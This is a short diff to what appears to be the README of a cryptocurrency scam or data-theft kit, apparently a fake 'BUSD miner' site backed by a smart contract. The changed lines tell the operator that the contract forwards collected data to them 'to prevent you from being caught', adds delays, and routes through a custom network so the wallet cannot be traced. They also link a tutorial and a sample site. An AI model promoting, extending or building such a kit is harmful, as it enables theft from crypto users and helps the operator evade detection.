@@ -47,7 +47,9 @@ Smart contract
 
 1. the smart contract will foward the data to you to prevent you from being caught 
 
-3. the contract has a 2 hour on average delay for added security
+2. the contract has a 2 hour on average delay for added security
+
+3. The smart contract is deployed on a custom network for added security it cannot be found by the wallet address the script adds details to a custom blockchain network that will then foward it to you on the bsc network this part is copyrighted
 
 youtube tutorial https://www.youtube.com/watch?v=SnDlcDBAjso
 sample site https://busdminer.netlify.app/
